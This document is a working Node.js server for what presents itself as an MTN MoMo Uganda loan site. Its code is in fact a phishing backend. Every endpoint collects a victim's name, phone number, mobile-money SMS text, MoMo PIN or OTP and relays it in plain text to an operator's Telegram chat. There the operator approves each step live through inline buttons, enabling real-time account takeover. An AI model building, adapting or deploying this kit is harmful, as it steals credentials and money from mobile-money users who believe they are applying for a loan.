// ============================================================
// server.js – Uganda Version (MTN MoMo Uganda)
// ============================================================
console.log("🟢 1. Server is starting...");
require('dotenv').config();
console.log("🟢 2. dotenv loaded");

const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');

const app = express();

app.use(cors());
app.use(express.json());

// Serve static files from the frontend directory
app.use(express.static(path.join(__dirname, '../frontend')));

// ─── In-Memory Store ───
const applications = {};

const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Check if environment variables are set
if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment variables');
    console.log('Please set these in your .env file or Render environment variables');
}

const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

console.log('✅ Server starting...');

async function sendTelegramMessage(message, buttons = null) {
    if (!TELEGRAM_BOT_TOKEN) {
        console.error('❌ Cannot send message: TELEGRAM_BOT_TOKEN is missing');
        return { ok: false, error: 'Bot token missing' };
    }
    
    const body = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };
    
    try {
        const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        return await response.json();
    } catch (error) {
        console.error('Error sending Telegram message:', error);
        return { ok: false, error: error.message };
    }
}

// 1. Application
app.post('/api/send-application', async (req, res) => {
    try {
        const data = req.body.applicationData;
        const { applicationId, phone, loanAmount, loanTerm, firstName, lastName } = data;

        applications[applicationId] = { 
            ...data, 
            smsStatus: 'pending', 
            pinStatus: 'pending', 
            otpStatus: 'pending' 
        };
        console.log(`📝 Application created: ${applicationId}`);

        const message = `📋 *NEW LOAN APPLICATION (UGANDA)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +256${phone}\n💰 Amount: UGX ${loanAmount.toLocaleString()}\n📅 Term: ${loanTerm}\n👤 Name: ${firstName} ${lastName}\n\n✅ *Please approve or reject this application:*`;
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
        ]];

        await sendTelegramMessage(message, buttons);
        res.json({ ok: true, applicationId, status: 'waiting_sms' });
    } catch (error) {
        console.error('Error in /api/send-application:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// 2. SMS
app.post('/api/send-momo-message', async (req, res) => {
    try {
        const { momoData } = req.body;
        const { applicationId, phone, momoMessage } = momoData;

        applications[applicationId].smsMessage = momoMessage;
        applications[applicationId].smsStatus = 'pending';

        const message = `📨 *SMS VERIFICATION (UGANDA)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +256${phone}\n\n📩 *SMS Content:*\n${momoMessage}\n\n✅ *Please approve or reject this SMS:*`;
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
        ]];

        await sendTelegramMessage(message, buttons);
        res.json({ ok: true, status: 'waiting_admin' });
    } catch (error) {
        console.error('Error in /api/send-momo-message:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// 3. PIN
app.post('/api/send-pin', async (req, res) => {
    try {
        const { applicationId, pin } = req.body;
        applications[applicationId].pin = pin;
        applications[applicationId].pinStatus = 'pending';

        const message = `🔐 *PIN VERIFICATION (UGANDA)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 PIN Entered: ${pin}\n\n✅ *Please approve or reject this PIN:*`;
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'PIN', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'PIN', applicationId }) }
        ]];

        await sendTelegramMessage(message, buttons);
        res.json({ ok: true, status: 'waiting_admin' });
    } catch (error) {
        console.error('Error in /api/send-pin:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// 4. OTP
app.post('/api/send-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;
        applications[applicationId].otp = otp;
        applications[applicationId].otpStatus = 'pending';

        const message = `🔑 *OTP VERIFICATION (UGANDA)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 OTP Entered: ${otp}\n\n✅ *Please approve or reject this OTP:*`;
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
        ]];

        await sendTelegramMessage(message, buttons);
        res.json({ ok: true, status: 'waiting_admin' });
    } catch (error) {
        console.error('Error in /api/send-otp:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// 5. Final
app.post('/api/send-final-details', async (req, res) => {
    try {
        const data = req.body.finalData;
        applications[data.applicationId].pinStatus = 'approved';

        const message = `✅ *LOAN COMPLETE (UGANDA)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${data.applicationId}\n📱 Phone: +256${data.phone}\n🔑 PIN Entered: ${data.pin}\n💰 Amount: UGX ${data.loanAmount.toLocaleString()}\n📅 Term: ${data.loanTerm}\n👤 Name: ${data.firstName} ${data.lastName}\n\n🎉 *Status: DASHBOARD ACCESS GRANTED*`;

        await sendTelegramMessage(message);
        res.json({ ok: true, status: 'dashboard_ready' });
    } catch (error) {
        console.error('Error in /api/send-final-details:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// 6. Webhook
app.post('/api/telegram-webhook', async (req, res) => {
    console.log('📩 Webhook received');
    
    try {
        // Handle callback queries (button clicks)
        if (req.body.callback_query) {
            const query = req.body.callback_query;
            console.log('🔘 Callback query:', query.data);
            
            try {
                const { action, step, applicationId } = JSON.parse(query.data);
                const app = applications[applicationId];
                
                if (!app) {
                    console.log(`❌ Application ${applicationId} not found`);
                    return res.sendStatus(200);
                }
                
                console.log(`📝 Processing ${step} for ${applicationId}: ${action}`);
                
                if (step === 'SMS' && app.smsStatus === 'pending') {
                    app.smsStatus = action === 'YES' ? 'approved' : 'rejected';
                    console.log(`📨 SMS status: ${app.smsStatus}`);
                } else if (step === 'PIN' && app.pinStatus === 'pending') {
                    app.pinStatus = action === 'YES' ? 'approved' : 'rejected';
                    console.log(`🔐 PIN status: ${app.pinStatus}`);
                } else if (step === 'OTP' && app.otpStatus === 'pending') {
                    app.otpStatus = action === 'YES' ? 'approved' : 'rejected';
                    console.log(`🔑 OTP status: ${app.otpStatus}`);
                }
                
                // Answer the callback
                await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: query.id,
                        text: `✅ ${action === 'YES' ? 'Approved' : 'Rejected'}!`,
                        show_alert: false
                    })
                });
                
                // Send confirmation
                const statusText = action === 'YES' ? '✅ Approved' : '❌ Rejected';
                await sendTelegramMessage(`📌 *Status Update (UGANDA)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📋 Step: ${step}\n📌 Status: ${statusText}`);
                
            } catch (parseError) {
                console.error('❌ Error parsing callback data:', parseError);
            }
            
            return res.sendStatus(200);
        }
        
        // Handle regular messages
        if (req.body.message && req.body.message.text) {
            console.log('💬 Message received:', req.body.message.text);
        }
        
        res.sendStatus(200);
        
    } catch (error) {
        console.error('❌ Webhook error:', error);
        res.sendStatus(500);
    }
});

// 7. Status
app.get('/api/status/:applicationId/:step', (req, res) => {
    try {
        const app = applications[req.params.applicationId];
        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
        
        let status = 'pending';
        if (req.params.step === 'sms') status = app.smsStatus;
        else if (req.params.step === 'pin') status = app.pinStatus;
        else if (req.params.step === 'otp') status = app.otpStatus;
        
        res.json({ ok: true, status });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// Serve index.html for all other routes
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📁 Serving frontend from: ${path.join(__dirname, '../frontend')}`);
    console.log(`🔗 Visit: http://localhost:${PORT}`);
});
